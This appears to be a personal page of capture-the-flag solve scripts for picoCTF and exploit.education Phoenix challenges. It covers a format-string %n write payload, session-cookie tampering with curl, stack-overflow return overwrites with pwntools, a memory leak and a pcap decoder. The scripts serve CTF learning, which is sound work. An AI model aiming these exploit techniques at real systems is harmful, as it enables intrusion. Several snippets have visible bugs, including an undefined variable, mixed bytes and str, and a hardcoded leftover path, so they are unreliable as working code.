---
title: "Scripting"
---

<p style="text-align: right">_- last update 22/04/2022 -_</p>

Exploiting format string's `%n` to write in memory:
---------------------------------------------------

-	pure python
-	binary
-	format string

```python
import struct
import sys

addr = int(sys.argv[1], 16)
payload  = struct.pack("I", addr + 2) # ad
payload += struct.pack("I", addr + 1) # be
payload += struct.pack("I", addr + 3) # de
payload += struct.pack("I", addr) # ef
payload += b'%x-' * 8

payload += 'a' * (0xad - len(payload) - 26)
payload += '%hhn'

payload += 'a' * (0xbe - 0xad)
payload += '%hhn'

payload += 'a' * (0xde - 0xbe)
payload += '%hhn'

payload += 'a' * (0xef - 0xde)
payload += '%hhn'

print(payload)
```

Solves [picoctf#46](https://play.picoctf.org/practice/challenge/46)
-------------------------------------------------------------------

```bash
#!/bin/bash

curl -sLX POST -c cookies.txt -b cookies.txt -d 'user=&password=' 'https://jupiter.challenges.picoctf.org/problem/44573/login' > /dev/null
sed -i 's/False$/True/' cookies.txt
curl -sL -c cookies.txt -b cookies.txt 'https://jupiter.challenges.picoctf.org/problem/44573/flag' | hq code text
rm cookies.txt
```

Solves [picoctf#112](https://play.picoctf.org/practice/challenge/112)
---------------------------------------------------------------------

I wrote a [BMP patcher](https://gist.github.com/0b11stan/63024db70c2766ee27ca7803b9634896).

Solves [picoctf#35](https://play.picoctf.org/practice/challenge/35)
-------------------------------------------------------------------

```python
#!/bin/python

from pwn import *

context.log_level = 'CRITICAL'


def x_sclean(string): return string.strip().split()
def x_send(msg): return conn.sendline(msg.encode('utf-8'))
def x_read(token): return conn.recvuntil(token)
def x_unbase(m, b): return ''.join([chr(int(c, b)) for c in m if len(c) > 0])


conn = remote('jupiter.challenges.picoctf.org', 29956)

x_read(b'Please give the')
msg = x_unbase(x_sclean(x_read(b'as'))[:-1], 2)
x_read(b'Input:\n')
x_send(msg)

x_read(b'Please give me the')
msg = x_unbase(x_sclean(x_read(b'as'))[:-1], 8)
x_read(b'Input:\n')
x_send(msg)

x_read(b'Please give me the')
msg = x_sclean(x_read(b'as'))[:-1][0].decode()
msg = [''.join([msg[i], msg[i+1]]) for i in range(0, len(msg) - 1, 2)]
msg = x_unbase(msg, 16)
x_read(b'Input:\n')
x_send(msg)

print(conn.recvall().strip().split()[-1].decode())
```

Solves [picoctf#152](https://play.picoctf.org/practice/challenge/152)
---------------------------------------------------------------------

-	webassembly
-	wasm

```bash
curl -s http://mercury.picoctf.net:37669/JIFxzHyW8W | wasm-decompile - | grep 'picoCTF{' | tr -d '";' | head -c -7; echo
```

Solves [picoctf#105](https://play.picoctf.org/practice/challenge/105)
---------------------------------------------------------------------

-	format string

```python
#!/bin/python

from pwn import *

#conn = remote('chall.ctf.net', 27912)
conn = process('./a.out')

payload = "1" + beacon + "%08x" * 30

conn.sendline(payload)

line = ""
while not beacon in line:
    line = conn.recvline().decode()

extract = line[len(beacon):]

for octets in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
  try :
    print(octets, "-", bytes.fromhex(octets).decode()[::-1])
  except :
    print(octets, "✖")
```

Solves [exploit-education#1](https://exploit.education/phoenix/stack-one/)
--------------------------------------------------------------------------

Template for feeding a process in search of the right output.

```python
#!/bin/python

from pwn import *
import struct

probes = [
    'a.out: specify an argument, to be copied into the "buffer"',
    'Getting closer! changeme is currently 0x00000000, we want 0x496c5962',
    'Getting closer! changeme is currently 0x00000049, we want 0x496c5962',
    'Getting closer! changeme is currently 0x0000496c, we want 0x496c5962',
    'Getting closer! changeme is currently 0x00496c59, we want 0x496c5962',
]
target = struct.pack("I", 0x496c5962)
result = probes[0]
cmpt = 0

while result in probes:
    payload = b"a" * cmpt + target
    conn = process(['./a.out', payload])
    conn.readline()
    result = conn.readline().decode().strip()
    cmpt += 1
    print(result)
    print(cmpt, payload)
```

Solves [exploit-education#3 and exploit-education#4](https://exploit.education/phoenix/stack-three/)
----------------------------------------------------------------------------------------------------

```python
#!/bin/python

from pwn import *
import struct

conn = process('./a.out')
payload = cyclic(100)
print(conn.recvline())
conn.sendline(payload)
extract = conn.recvline().decode().strip().split('x')[1]
offset = cyclic_find(bytes.fromhex(extract).decode()[:4])

e = ELF('./a.out')
print(hex(e.symbols['complete_level']))
target = p32(e.symbols['complete_level'])

payload = cyclic(offset - 1) + target
conn = process('./a.out')
print(conn.recvline().decode())
conn.sendline(payload)
print(conn.recvline().decode())
print(conn.recvline().decode())
```

Solves [picoctf#115](https://play.picoctf.org/practice/challenge/115)
---------------------------------------------------------------------

-	forensic
-	scapy
-	pcap
-	crypto

```python
#!/bin/python
import string
import sys
from urllib.request import urlretrieve
from scapy.all import *

AL = string.ascii_letters[:26]
AU = string.ascii_letters[26:]
KEY = 13


def rot(alpha, char):
    i = alpha.index(char)
    if i + KEY > len(alpha) - 1:
        return alpha[KEY - len(alpha) + i]
    else:
        return alpha[i+13]


def decrypt(cipher_text):
    plain_text = ''
    for char in cipher_text:
        if char in ' {}_' + string.digits:
            plain_text += char
        else:
            plain_text += rot(AL, char) if char in AL else rot(AU, char)
    return plain_text


def extract_secret(file_path):
    packets = rdpcap(file_path)
    def f(x): return x.haslayer(IP) and x[IP].src == '18.222.37.134'
    return [
        p[Raw] for p in packets.filter(f)
        if p.haslayer(Raw)
    ][0].load.split(b'\n')[-2].decode('utf-8')


def main(url):
    file_path = urlretrieve(url)[0]
    cipher_text = extract_secret(file_path)
    cipher_text = extract_secret('/tmp/tmpaq2c1b7l')
    print(decrypt(cipher_text))


if '__main__' == __name__:
    def usage(x): return print(f"Usage: {x} 'http://link-to-pcap'")
    if len(sys.argv) != 2 or sys.argv[1].strip() in ['-h', '--help']:
        usage(sys.argv[0])
    else:
        main(sys.argv[1].strip())
```
